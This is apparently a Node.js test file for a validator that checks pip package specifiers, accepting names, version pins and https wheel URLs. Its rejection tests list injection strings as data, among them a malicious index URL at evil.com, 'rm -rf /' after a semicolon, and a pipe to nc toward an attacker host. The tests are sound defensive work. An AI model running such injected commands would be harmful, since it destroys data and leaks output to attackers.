/**
 * Tests for services/pip-spec.js — the safe pip-specifier validator that
 * replaced the name-based whitelist.
 *
 * The security contract:
 *   - accept well-formed names, PEP440 pins, and https wheel URLs
 *   - reject pip options (--index-url, -r), shell metacharacters, whitespace,
 *     and option-like tokens — so argv-form pip calls cannot be injected.
 *   - a brand-new LLM SDK (no code change) passes: `whatever-sdk==9.9.9`.
 *
 * Run: node --test tests/pip-spec.test.js
 */
const { test } = require('node:test')
const assert = require('node:assert')
const { assertSafePipSpec } = require('../services/pip-spec.js')

test('accepts a bare package name', () => {
  assert.deepStrictEqual(assertSafePipSpec('triton'), { ok: true, name: 'triton' })
})

test('accepts the Wan2GP-documented Claude Code pin verbatim', () => {
  const v = assertSafePipSpec('claude-agent-sdk==0.1.40')
  assert.strictEqual(v.ok, true)
  assert.strictEqual(v.name, 'claude-agent-sdk')
})

test('accepts other PEP440 operators (>=, <=, ~=, !=, >, <)', () => {
  assert.strictEqual(assertSafePipSpec('torch>=2.5.0').ok, true)
  assert.strictEqual(assertSafePipSpec('openai-codex~=0.1.0').ok, true)
  assert.strictEqual(assertSafePipSpec('foo<=1.2.3').ok, true)
  assert.strictEqual(assertSafePipSpec('bar!=1.0').ok, true)
})

test('accepts an https wheel URL (GGUF kernel style)', () => {
  const v = assertSafePipSpec('https://download.pytorch.org/whl/foo-1.0-cp311-none-win_amd64.whl')
  assert.strictEqual(v.ok, true)
})

test('accepts a future unknown LLM SDK with a pin (no code change needed)', () => {
  assert.strictEqual(assertSafePipSpec('some-future-llm-sdk==9.9.9').ok, true)
})

test('rejects pip options: --index-url', () => {
  assert.strictEqual(assertSafePipSpec('--index-url https://evil.com/simple').ok, false)
})

test('rejects -r / -e style option flags', () => {
  assert.strictEqual(assertSafePipSpec('-r reqs.txt').ok, false)
  assert.strictEqual(assertSafePipSpec('-e .').ok, false)
})

test('rejects shell metacharacters and whitespace', () => {
  assert.strictEqual(assertSafePipSpec('foo; rm -rf /').ok, false)
  assert.strictEqual(assertSafePipSpec('foo & bar').ok, false)
  assert.strictEqual(assertSafePipSpec('foo | nc attacker').ok, false)
  assert.strictEqual(assertSafePipSpec('foo `whoami`').ok, false)
  assert.strictEqual(assertSafePipSpec('foo\nbar').ok, false)
})

test('rejects a version operator with no version', () => {
  assert.strictEqual(assertSafePipSpec('foo==').ok, false)
})

test('rejects empty / non-string input', () => {
  assert.strictEqual(assertSafePipSpec('').ok, false)
  assert.strictEqual(assertSafePipSpec(null).ok, false)
})
